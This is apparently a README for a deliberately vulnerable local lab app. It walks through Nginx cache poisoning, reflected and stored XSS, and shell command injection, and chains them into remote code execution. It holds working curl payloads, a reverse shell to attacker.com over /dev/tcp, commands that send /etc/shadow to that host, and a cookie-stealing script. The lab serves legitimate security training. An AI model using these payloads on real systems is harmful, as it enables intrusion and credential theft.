# VulnLab — Deliberately Vulnerable Web Application

**For isolated, local security research practice only.**  
All ports are bound to `127.0.0.1` — nothing is exposed to the network.

---

## Quick Start

```bash
cd /root/testing_env/vuln-webapp
docker compose up --build
```

The app will be available at **http://localhost:8080**

---

## Architecture

```
Browser ──▶ Nginx :8080 (proxy + cache)
               │
               └──▶ Flask :5000 (backend)
```

- **Nginx** acts as a reverse proxy with an intentionally misconfigured cache.
- **Flask** serves three vulnerable endpoints and a cache-poisonable home page.
- **victim.html** is a static page served through Nginx to simulate a second user.

---

## Vulnerability 1 — Nginx Cache Poisoning

### Location
`nginx/nginx.conf` — the `proxy_cache_key` directive.

### The bug
The default cache key is:

```
$scheme$request_method$host$request_uri
```

Notice what's **missing**: `$http_x_forwarded_host`. The Nginx config forwards `X-Forwarded-Host` from the client to Flask, but the cache key doesn't include it. This means **different values of `X-Forwarded-Host` produce the same cache key**.

### The attack
1. Attacker sends a request to `/` with header `X-Forwarded-Host: attacker.com`
2. Nginx forwards this to Flask
3. Flask's `/` endpoint embeds `attacker.com` into the page:  
   `<script src="http://attacker.com/analytics.js"></script>`
4. Nginx caches this response keyed only on `($scheme$method$host$uri)` — not on `X-Forwarded-Host`
5. Every subsequent visitor to `/` (without any special headers) gets the cached response, which loads JavaScript from `attacker.com`
6. The attacker serves malicious JS from their server — full XSS on the origin

### Detection
Compare the `X-Forwarded-Host` value shown on the page before and after poisoning.

### Reproduction
```bash
# Terminal 1 — normal request (note the host shown on the page)
curl http://localhost:8080/

# Terminal 2 — poison the cache
curl -H 'X-Forwarded-Host: evil.example.com' http://localhost:8080/

# Terminal 3 — victim (no special headers, but gets poisoned response)
curl http://localhost:8080/
# The page now says "Loaded analytics from: evil.example.com"
```

---

## Vulnerability 2 — Reflected XSS (`/search?q=`)

### Location
`flask/app.py` — `search()` endpoint.

### The bug
The `q` query parameter is injected directly into the HTML response using an f-string, with zero sanitization:

```python
return Response(f"...<h1>Search results for: {q}</h1>...")
```

### The attack
```bash
# Basic alert
curl 'http://localhost:8080/search?q=<script>alert(1)</script>'

# Steal cookies
curl 'http://localhost:8080/search?q=<script>fetch("http://attacker.com/steal?c="%2Bdocument.cookie)</script>'

# Can be combined with cache poisoning for persistent delivery
curl -H 'X-Forwarded-Host: attacker.com' \
  'http://localhost:8080/search?q=<script>...</script>'
```

---

## Vulnerability 3 — Stored XSS (`/store` + `/display`)

### Location
`flask/app.py` — `store()` and `display()` endpoints.

### The bug
- `/store` accepts JSON with a `content` field and appends it to an in-memory list
- `/display` renders all stored items directly into HTML using f-strings

No sanitization at either input or output.

### The attack
```bash
# Step 1 — store a malicious payload
curl -X POST http://localhost:8080/store \
  -H 'Content-Type: application/json' \
  -d '{"content": "<script>alert(document.cookie)</script>"}'

# Step 2 — any user visiting /display gets the payload
curl http://localhost:8080/display
```

This vulnerability persists across requests until the server restarts (in-memory storage).

---

## Vulnerability 4 — Command Injection / RCE (`/run?cmd=`)

### Location
`flask/app.py` — `run()` endpoint.

### The bug
The `cmd` query parameter is passed directly to `subprocess.check_output()` with `shell=True`. This means arbitrary shell metacharacters are interpreted.

```python
result = subprocess.check_output(cmd, shell=True, ...)
```

### The attack
```bash
# Read files
curl 'http://localhost:8080/run?cmd=cat%20/etc/passwd'

# Reverse shell (outbound — only works if network allows)
curl 'http://localhost:8080/run?cmd=bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261'

# Exfiltrate data
curl 'http://localhost:8080/run?cmd=curl%20http://attacker.com/exfil?d=$(base64%20/etc/shadow)'

# Simple recon
curl 'http://localhost:8080/run?cmd=id'
curl 'http://localhost:8080/run?cmd=ls%20-la%20/app'
curl 'http://localhost:8080/run?cmd=env'
```

---

## Intended Attack Chain

The full chain demonstrates how an attacker escalates from a cache-layer weakness to full remote code execution:

### Step 1 — Cache Poisoning (infiltrate the cache)

```
Attacker ──▶ Nginx ──▶ Flask (poisoned response cached)
Attacker sends: GET /  with  X-Forwarded-Host: attacker.com
Cache stores:   /  →  [page with <script src="http://attacker.com/analytics.js">]
```

### Step 2 — XSS Delivery (victim hits the poisoned cache)

```
Victim ──▶ Nginx ──▶ (cache hit) ──▶ poisoned page
Victim browser loads http://attacker.com/analytics.js
```

### Step 3 — Staged Payload (attacker's JS takes control)

The victim's browser now runs `analytics.js` (served by attacker). This script can:

```javascript
// Example analytics.js — attacker-controlled
(function() {
  // Harvest cookies
  fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie));

  // Read the page content
  const content = document.body.innerText;
  fetch('http://attacker.com/content?d=' + encodeURIComponent(content));

  // Trigger RCE on the origin
  fetch('http://localhost:8080/run?cmd=' + encodeURIComponent(
    'curl http://attacker.com/exfil -d @/etc/shadow'
  ));
})();
```

### Step 4 — RCE (command injection on the backend)

The `fetch` to `/run?cmd=...` executes on the server with full shell access, completing the chain:

**Cache layer → Application layer (XSS) → System layer (RCE)**

---

## Testing Tips

### Disable cache for fresh results
```bash
# Bypass cache entirely (included in nginx config)
curl -H 'X-Cache-Bypass: 1' http://localhost:8080/
```

### Watch cache status
```bash
# Nginx adds X-Cache-Status header: HIT, MISS, or BYPASS
curl -I http://localhost:8080/ 2>&1 | grep -i x-cache
```

### Clear the cache
```bash
# The cache is in a Docker volume; restart nginx to clear it
docker compose restart nginx

# Or blow away everything
docker compose down -v && docker compose up --build
```

### Reset stored XSS data
```bash
# Stored XSS is in Flask's in-memory list; restart Flask
docker compose restart flask
```

---

## ⚠️ Warnings

- **Do not deploy this.** It is intentionally broken in multiple ways.
- **Do not expose it to any network.** Ports are bound to `127.0.0.1` only.
- **Do not run this on a machine with sensitive data.** The `/run?cmd=` endpoint gives full OS access to anyone who can reach port 8080.
- **Do not use this to test any system you do not own.** This is for your own personal lab only.

Why each binding is `127.0.0.1`:
| Port | Binding | Accessible from |
|------|---------|-----------------|
| 8080 | `127.0.0.1` | Only localhost |

If you see `0.0.0.0` anywhere, something is misconfigured — stop immediately.
